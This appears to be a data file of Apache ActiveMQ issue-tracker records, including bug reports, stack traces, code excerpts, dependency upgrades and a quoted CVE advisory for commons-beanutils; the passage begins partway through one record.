I have redelivery configured, but when it fails in all attempts (through a RuntimeException), I get the following message:11:00:54,775 DEBUG &#91;ServerSessionImpl:0&#93; Endpoint failed to process message.java.lang.NullPointerException at org.apache.activemq.ra.ServerSessionImpl.afterDelivery(ServerSessionImpl.java:218) at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:723) at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:163) at org.apache.geronimo.connector.work.WorkerContext.run(WorkerContext.java:291) at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source) at java.lang.Thread.run(Unknown Source)11:00:54,775 INFO  &#91;ServerSessionImpl:0&#93; Endpoint failed to process message. Reason: java.lang.NullPointerException11:00:54,775 DEBUG &#91;ServerSessionImpl:0&#93; run loop end11:00:54,775 DEBUG &#91;ServerSessionImpl:0&#93; Endpoint did not release properly: org.apache.activemq.ra.InvalidMessageEndpointExceptionorg.apache.activemq.ra.InvalidMessageEndpointException at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointDead.release(MessageEndpointProxy.java:156) at org.apache.activemq.ra.MessageEndpointProxy.release(MessageEndpointProxy.java:68) at org.apache.activemq.ra.ServerSessionImpl.close(ServerSessionImpl.java:250) at org.apache.activemq.ra.ServerSessionPoolImpl.removeFromPool(ServerSessionPoolImpl.java:180) at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:177) at org.apache.geronimo.connector.work.WorkerContext.run(WorkerContext.java:291) at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source) at java.lang.Thread.run(Unknown Source)11:00:54,775 DEBUG &#91;ServerSessionImpl:0&#93; Run finished11:00:54,775 DEBUG &#91;ServerSessionImpl:0&#93; Work completed: javax.resource.spi.work.WorkEvent&#91;source=Work :ServerSessionImpl:0&#93;11:00:54,790 DEBUG &#91;ServerSessionPoolImpl&#93; ServerSession requested.The code that throws this NPE is ServerSessionImpl, whose excerpt I send below. There are more reports of this             try {                endpoint.afterDelivery();            } catch (Throwable e) {                throw new RuntimeException("Endpoint after delivery notification failure", e);            } finally {                if( session.getTransactionContext().isInLocalTransaction() ) { <<<<--------------------------- NPE                    if( !useRAManagedTx ) {                        // Sanitiy Check: If the local transaction has not been commited..                        // Commit it now.                        log.warn("Local transaction had not been commited.  Commiting now.");                    }                    try {                        session.commit();                    } catch (JMSException e) {                        log.info("Commit failed:", e);                    }                }            }
issueID:AMQ-6891
type:Bug
changed files:
texts:Duplicated message in JMS transaction, when jdbc persistence fails (Memory leak on Queue)
I have following scenario (see attached test case): Send 1 message in JMS transaction Enable database problem simulation (throw SQLException in TransactionContext.executeBatch() method - the similar situation should happen, when commit fails) Attempt to send 2 messages in one JMS transaction, send operation fails as is expected (only 1 message is in database from first send operation) Disable database problem simulation (SQLException is not thrown from now) Repeat the attempt to send "the same" 2 messages in one JMS transaction, send operation is successful now, how is expected (3 messages are in database) Attempt to receive 3 messages 1, 2, 3, but 5 messages are received 1, 2, 3, 2, 3.I have suspicion, that problem is in org.apache.activemq.broker.region.Queue. It seems that reason is indexOrderedCursorUpdates list. The Queue.onAdd(MessageContext) method is invoked for each message by JDBCMessageStore.addMessage(ConnectionContext, Message) method, which adds MessageContext into this list. The added MessageContext is processed (and removed) in Queue.doPendingCursorAdditions() method, which is invoked only from "afterCommit synchronization" (Queue.CursorAddSync.afterCommit() method). But when commit operation fails, then "afterCommit" method is not invoked (but afterRollback method is invoked) and MessageContext entries stays in indexOrderedCursorUpdates list.Personaly I would expect, that some "remove" operation should be done in Queue.CursorAddSync.afterRolback() method. Probably the similar operation should be done in Queue.doMessageSend() method on place, where Exception from "addMessage" is handled in case when JMS transaction is not used. Or some different "completion" operation should be introduced, because MessageContext is only add into the list,  but don"t removed in case of failure.When I tried to register (and use) LeaseLockerIOExceptionHandler IOExceptionHandler, the transports was successfully restarted, but my "client" code was blocked in ActiveMQSession.commit() method. Is it expected behavior?When I tried to add following code into Queue.CursorAddSync.afterRollback(), I received only 3 expected messages (when JMS transaction is used), but it was only blind shot, sorry, because I don"t understand the whole logic here.@Overridepublic void afterRollback() throws Exception {  synchronized(indexOrderedCursorUpdates) {    for(int i = indexOrderedCursorUpdates.size() - 1; i >= 0; i--) {      MessageContext mc = indexOrderedCursorUpdates.get(i);        if(mc.message.getMessageId().equals(messageContext.message.getMessageId())) {        indexOrderedCursorUpdates.remove(mc);        if(mc.onCompletion != null) {          mc.onCompletion.run();        }        break;      }    }  }  messageContext.message.decrementReferenceCount();} 
issueID:AMQ-6901
type:Bug
changed files:DestinationMap.java
texts:Destination with wildcard may not have correct policy applied if multiple wildcard policies exist
Back in AMQ-6109 I fixed an issue where the wrong policy was being applied to a destination. when there were wildcards.  It turns out that this was only a partial fix and there is another edge case where if there are multiple wild card policies (and some are children) , it is possible for the wrong child card policy to be applied to a destination at a higher parent level which is incorrect.
issueID:AMQ-6906
type:Bug
changed files:
texts:XA JDBC rolled back recovered ack messages pending till restart when cache disabled
When a prepared xa transaction with acks is rolledback after recovery, the message in the store is available for redelivery however it may have been skipped and the cursor will ignore till restart.When the cache is disabled and there are further message sends it is possible to reproduce.
issueID:AMQ-6907
type:Improvement
changed files:
texts:Make conditionalNetworkBridgeFilterFactory selectorAware
A destination policy can supply a networkBridgeFilterFactory that can gate dispatch across a network bridge. There is one that is conditional on their being no local consumers.this enhancement makes it such that there are no "matching" consumers.conditionalNetworkBridgeFilterFactory selectorAware="true"
issueID:AMQ-6909
type:Task
changed files:AmqpWritableBuffer.java
pom.xml
AmqpConnection.java
texts:AMQP: Update Qpid JMS to latest 0.32.0 release and Proton-j to 0.27.1 to match
None
issueID:AMQ-691
type:Bug
changed files:ResponseCorrelator.java
texts:ResponseCorrelator does not release blocked sync requests when transport has an async failure.
Reported at:http://www.nabble.com/publish%28%29-call-to-remote-JMS-server-hangs-t1446830.html#a3970530
issueID:AMQ-6924
type:Bug
changed files:StoreDurableSubscriberCursor.java
texts:StoreDurableSubscriberCursor does not timeout properly on non-persistent message send
I found an issue today on a broker when the temporary store was full and a non-persistent message was trying to be added to a durable subscription.  Analysis showed that the broker was stuck in a loop trying to add the non-persistent message to the temporary store because the maxWaitTime value is not properly used inside of StoreDurableSubscriberCursor. Instead of honoring a timeout value and failing, the waitForSpace() method call on the temporary store was stuck in a loop waiting indefinitely for free space.
issueID:AMQ-6928
type:Improvement
changed files:
texts:Upgrade to Camel 2.21.0
Camel 2.21 was just released
issueID:AMQ-6930
type:Wish
changed files:
texts:bin/activemq should allow stdout/stderr to some file instead of /dev/null for daemon mode
if I do "bin/activemq start" the ActiveMQ process is started with stdout/stdin redirected to /dev/null. This makes it hard to debug issue like out of memory error because we can"t see any log, for example, when the JVM flag "ExitOnOutOfMemoryError" is turned on. 
issueID:AMQ-6934
type:Improvement
changed files:
texts:Update Jackson to latest version
Jackson has not been updated in a while, update it to the latest version (currently 2.9.4)
issueID:AMQ-6935
type:Improvement
changed files:
texts:Update Jolokia to 1.5.0
Update Jolokia to latest version (1.5.0)
issueID:AMQ-6940
type:Bug
changed files:
texts:Significant memory footprint increase from 5.8.0 to 5.15.3
Recently we upgraded from 5.8.0 to 5.15.3 on one of our environments and found the broker running out of memory with the old broker configurations.I suspect this may be related to the new inflight message size calculation but haven"t been able to create a reproducer just yet.Broker JVM running with opts -Xss256k -Xms600m -Xmx600m -Xmn128m -Dfile.encoding=ISO-8859-1 -Dlog4j.watchDelay=60000 -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintPromotionFailure -XX:PrintFLSStatistics=1 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:+PrintClassHistogram -verbose:gc -Dsun.rmi.dgc.client.gcInterval=7200000 -Dsun.rmi.dgc.server.gcInterval=7200000
issueID:AMQ-6947
type:Bug
changed files:Queue.java
texts:Queue pending message count can go negative on duplicates
I have a found an edge case where the destination statistics counter on a Queue can go negative if there are duplicate messages (which should be rare).  The issue is the statistic is decremented but should not be because the message was already dropped since there was a duplicate.  Also, another statistic is improperly incremented which is the dequeue counter.
issueID:AMQ-695
type:Bug
changed files:
texts:Error when removing temp destinations (message on server console)
WARN Service - Failed to remove tmp destination temp-topic://ID:rfs8.lab.reconnex.net-34639-1146084114685-4:10:3javax.jms.JMSException: Destination still has an active subscription: topic://ActiveMQ.Advisory.TempTopic        at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:99)        at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:222)        at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:129)        at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:157)        at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:129)        at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:141)        at org.apache.activemq.broker.AbstractConnection.processRemoveConnection(AbstractConnection.java:523)        at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:59)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:93)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:139)        at java.lang.Thread.run(Thread.java:595)WARN Service - Failed to remove tmp destination temp-topic://ID:rfs8.lab.reconnex.net-34639-1146084114685-4:10:4javax.jms.JMSException: Destination still has an active subscription: topic://ActiveMQ.Advisory.TempTopic        at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:99)        at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:222)        at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:129)        at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:157)        at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:129)        at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:141)        at org.apache.activemq.broker.AbstractConnection.processRemoveConnection(AbstractConnection.java:523)        at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:59)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:93)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:139)        at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-6954
type:Bug
changed files:
texts:Queue page on web console displays URL parameter without proper encoding
Using a URL with the parameter, QueryFilter, the value of that parameter is included in the output page without proper encoding.
issueID:AMQ-6957
type:Improvement
changed files:
texts:Upgrade to Camel 2.21.1
None
issueID:AMQ-6958
type:Improvement
changed files:AmqpWireFormat.java
texts:AMQP: Set a default maxFrameSize for AMQP connections
Currently the AMQP protocol head does not set a max AMQP frame size by default which means the default of a 4GB max frame size is assumed.  Due to recent changes in proton-j we can now more efficiently handle multi-framed deliveries and configure the broker to not send frames larger than a given size which makes handling of larger messages more efficient in some cases and allows the proton-j buffering to work in a more efficient manner than what it does by default. 
issueID:AMQ-6959
type:Improvement
changed files:ActiveMQSession.java
texts:Avoid creating a Throwable in case of non-trace logging
We should not create a Throwable object (which will call fillInStackTrace() method) in case of non TRACE logging. For example if we have an INFO log level, message will not be created and logged, but a Throwable object will be created.I"m talking about the following method:org.apache.activemq.transaction.Synchronization#afterRollbackLOG.trace("rollback {}", ack, new Throwable("here"));  PR: https://github.com/apache/activemq/pull/282
issueID:AMQ-696
type:Bug
changed files:
texts:Client: XXX already connected exception when connection started after consumers added
While using the new Spring-2.0 DefaultMessageListenerContainer I can reliably reproduce the following exception on the broker side which usually results in a hang on the client side:The broker logs the following exception:INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: ID:inspiron-1410-1146192747453-2:1 already connectedjavax.jms.InvalidClientIDException: Broker: localhost - Client: ID:inspiron-1410-1146192747453-2:1 already connected        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:154)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:65)        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:69)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:65)        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:77)        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:500)        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:93)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:139)        at java.lang.Thread.run(Thread.java:595)I have extrapolated the sequence of calls that DefaultMessageListenerContainer is making and managed to produce a simple test case that reproduces the problem:import junit.framework.TestCase;import org.apache.activemq.ActiveMQConnectionFactory;import org.apache.activemq.command.ActiveMQQueue;import javax.jms.*;public class TestActiveMQ extends TestCase {    public void testConnectionFactory() throws Exception {        final ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory("tcp://localhost:61616");        final ActiveMQQueue queue = new ActiveMQQueue("testqueue");        final Connection conn = cf.createConnection();        Runnable r = new Runnable() {            public void run() {                try {                    Session session = conn.createSession(false, 1);                    MessageConsumer consumer = session.createConsumer(queue, null);                    Message msg = consumer.receive(1000);                } catch (JMSException e) {                    e.printStackTrace();                }            }        };        new Thread(r).start();        conn.start();        try {            synchronized (this) {                wait(3000);            }        } catch (InterruptedException e) {            e.printStackTrace();        }    }}Let us know if you need anymore information. Dont want to scrub ActiveMQ from my list of candidates If I can help it.cheerscraig
issueID:AMQ-6962
type:Improvement
changed files:
texts:Update Spring framework version
Update to the latest 4.3.x release
issueID:AMQ-6967
type:Bug
changed files:
texts:Periodic expiry with no consumers fails to page in messages if cache has flipped
when there are no consumers on a queue and message sends push the cursor to the default 70% memory limit, message expiry can fail to page in messages.The logic respects the cursor memory limit but fails to account for never having done a page in for browse/expiry or dispatch
issueID:AMQ-6968
type:Bug
changed files:ActiveMQConnection.java
texts:Incorrect error can be thrown from method that receives a security exception
If a client side operation receives an SecurityException as am ErrorResponse and the client closes the connection from the JMS ExceptionListener when the listener is triggered by that exception the Connection ExecutorService could throw a RejectedExecutionException and the client code will pass along that error instead of the originally intended JMSSecurityException
issueID:AMQ-6970
type:Bug
changed files:ActiveMQManagedConnectionFactory.java
ActiveMQConnectionSupport.java
ActiveMQConnectionFactory.java
texts:SSL config-params are not propagated inside rar correctly
When trying to configure the SSL config-properties (such as key store), they are not propagated throughout the rar correctly and an error to connect to the server occurs.The stack trace below shows an attempt to run the rar deployed in a Wildfly server instance (notice that the error is the same you would see if you failed to configure the config-properties)16:57:22,081 WARN  &#91;org.jboss.jca.core.connectionmanager.pool.strategy.OnePool&#93; (default task-1) IJ000604: Throwable while attempting to get a new connection: null: javax.resource.ResourceException: Could not create connection.     at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.createManagedConnection(ActiveMQManagedConnectionFactory.java:210)     at org.jboss.jca.core.connectionmanager.pool.mcp.SemaphoreConcurrentLinkedDequeManagedConnectionPool.createConnectionEventListener(SemaphoreConcurrentLinkedDequeManagedConnectionPool.java:1326)     at org.jboss.jca.core.connectionmanager.pool.mcp.SemaphoreConcurrentLinkedDequeManagedConnectionPool.getConnection(SemaphoreConcurrentLinkedDequeManagedConnectionPool.java:499)     at org.jboss.jca.core.connectionmanager.pool.AbstractPool.getSimpleConnection(AbstractPool.java:632)     at org.jboss.jca.core.connectionmanager.pool.AbstractPool.getConnection(AbstractPool.java:604)     at org.jboss.jca.core.connectionmanager.AbstractConnectionManager.getManagedConnection(AbstractConnectionManager.java:624)     at org.jboss.jca.core.connectionmanager.tx.TxConnectionManagerImpl.getManagedConnection(TxConnectionManagerImpl.java:430)     at org.jboss.jca.core.connectionmanager.AbstractConnectionManager.allocateConnection(AbstractConnectionManager.java:789)     at org.apache.activemq.ra.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:95)     at org.apache.activemq.ra.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:67)     at org.jboss.as.quickstarts.servlet.HelloWorldMDBServletClient.doGet(HelloWorldMDBServletClient.java:98)     at javax.servlet.http.HttpServlet.service(HttpServlet.java:687)     at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)     at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)     at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)     at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:67)     at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)     at org.wildfly.extension.undertow.security.SecurityContextAssociationHandler.handleRequest(SecurityContextAssociationHandler.java:78)     at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)     at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132)     at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)     at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)     at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)     at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)     at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)     at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)     at io.undertow.security.handlers.NotificationReceiverHandler.handleRequest(NotificationReceiverHandler.java:50)     at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)     at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)     at org.wildfly.extension.undertow.security.jacc.JACCContextIdHandler.handleRequest(JACCContextIdHandler.java:61)     at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)     at org.wildfly.extension.undertow.deployment.GlobalRequestControllerHandler.handleRequest(GlobalRequestControllerHandler.java:68)     at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)     at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292)     at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81)     at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138)     at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135)     at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)     at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)     at org.wildfly.extension.undertow.security.SecurityContextThreadSetupAction.lambda$create$0(SecurityContextThreadSetupAction.java:105)     at org.wildfly.extension.undertow.deployment.UndertowDeploymentInfoService$UndertowThreadSetupAction.lambda$create$0(UndertowDeploymentInfoService.java:1514)     at org.wildfly.extension.undertow.deployment.UndertowDeploymentInfoService$UndertowThreadSetupAction.lambda$create$0(UndertowDeploymentInfoService.java:1514)     at org.wildfly.extension.undertow.deployment.UndertowDeploymentInfoService$UndertowThreadSetupAction.lambda$create$0(UndertowDeploymentInfoService.java:1514)     at org.wildfly.extension.undertow.deployment.UndertowDeploymentInfoService$UndertowThreadSetupAction.lambda$create$0(UndertowDeploymentInfoService.java:1514)     at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272)     at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81)     at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104)     at io.undertow.server.Connectors.executeRootHandler(Connectors.java:360)     at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830)     at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35)     at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:1985)     at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1487)     at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1349)     at java.lang.Thread.run(Thread.java:748) Caused by: javax.jms.JMSException: Could not connect to broker URL: ssl://localhost:61617. Reason: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target     at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:36)     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:374)     at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:252)     at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:89)     at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:70)     at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.createManagedConnection(ActiveMQManagedConnectionFactory.java:208)     ... 53 more Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target     at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)     at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1959)     at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:328)     at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:322)     at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1614)     at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:216)     at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1052)     at sun.security.ssl.Handshaker.process_record(Handshaker.java:987)     at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1072)     at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1385)     at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:938)     at sun.security.ssl.AppInputStream.read(AppInputStream.java:105)     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)     at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:634)     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:59)     at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:619)     at java.io.DataInputStream.readInt(DataInputStream.java:387)     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:268)     at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:240)     at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:232)     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)     ... 1 more Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target     at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:397)     at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:302)     at sun.security.validator.Validator.validate(Validator.java:260)     at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324)     at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:229)     at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:124)     at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1596)     ... 17 more Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target     at sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:141)     at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:126)     at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:280)     at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:392)     ... 23 more
issueID:AMQ-6974
type:Improvement
changed files:
texts:overflow errors with timestamps
Some comparisons with timestamp values are not safe. This comparisons can trigger errors that were found in other Apache projects, e.g. KAFKA-4290.A pull request that fixes those comparisons is available on github: https://github.com/apache/activemq/pull/284
issueID:AMQ-6979
type:Bug
changed files:
texts:consumer message pull timeout being effected by long running scheduled tasks
The messagePull timeout, used for prefetch=0 consumers with consumer.receive(timeout) is not reliable in the event that the broker scheduler timer task is busy with long running tasks.If an existing task exceeds the timeout then the pull response is delayed.In the main, scheduled tasks should be short lived and in the case of message expiry processing for topic durable subs, they may not be, depending on the amount of durable subs and their backlog. The expiryProcessing scheduler task should simply signal the start of the task such that it can return and leave the real work to the taskExecutor
issueID:AMQ-699
type:Improvement
changed files:
texts:Add PropertyPlaceholderConfigurer to default activemq.xml
The default activemq.xml should include a Spring PropertyPlaceholderConfigurer to allow the activemq.home property to be used to root directories.For example, this configuration will save data to ${activemq.home}/var/data always, no matter where the script was run from.<beans xmlns="http://activemq.org/config/1.0">    <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">        <property name="systemPropertiesModeName" value="SYSTEM_PROPERTIES_MODE_OVERRIDE"/>    </bean>    <broker useJmx="true">        <persistenceAdapter>            <journaledJDBC journalLogFiles="5" dataDirectory="${activemq.home}/var/data"/>        </persistenceAdapter>            <transportConnectors>            <transportConnector name="default" uri="tcp://localhost:16161" discoveryUri="multicast://default"/>        </transportConnectors>    </broker></beans> Also, the default Log4j configuration should be augmented to use this property for the out appender:# File appenderlog4j.appender.out=org.apache.log4j.RollingFileAppenderlog4j.appender.out.file=${activemq.home}/var/log/activemq.loglog4j.appender.out.maxFileSize=1024KBlog4j.appender.out.maxBackupIndex=5log4j.appender.out.append=truelog4j.appender.out.layout=org.apache.log4j.PatternLayoutlog4j.appender.out.layout.ConversionPattern=%d [%-15.15t] %-5p %-30.30c{1} - %m%n
issueID:AMQ-6990
type:Bug
changed files:
texts:ActiveMQ 5.15.4 commons-beanutils-core-1.8.0.jar which has one high severity CVE against it.
ActiveMQ 5.15.4 commons-beanutils-core-1.8.0.jar which has one high severity CVE against it.Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.CVE-2014-0114 Severity:High CVSS Score: 7.5 (AV:N/AC:L/Au:N/C/I/A)CWE: CWE-20 Improper Input ValidationApache Commons BeanUtils, as distributed in lib/commons-beanutils-1.8.0.jar in Apache Struts 1.x through 1.3.10 and in other products requiring commons-beanutilsthrough 1.9.2, does not suppress the class property, which allows remote attackers to "manipulate" the ClassLoader and execute arbitrary code via the class parameter, asdemonstrated by the passing of this parameter to the getClass method of the ActionForm object in Struts 1.BID - 67121BUGTRAQ - 20141205 NEW: VMSA-2014-0012 - VMware vSphere product updates address security vulnerabilitiesCONFIRM - http://advisories.mageia.org/MGASA-2014-0219.htmlCONFIRM - http://commons.apache.org/proper/commons-beanutils/javadocs/v1.9.2/RELEASE-NOTES.txtCONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21674128CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21674812CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675266CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675387CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675689CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675898CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675972CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676091CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676110CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676303CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676375CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676931CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21677110CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg27042296CONFIRM - http://www.ibm.com/support/docview.wss?uid=swg21675496CONFIRM - http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.htmlCONFIRM - 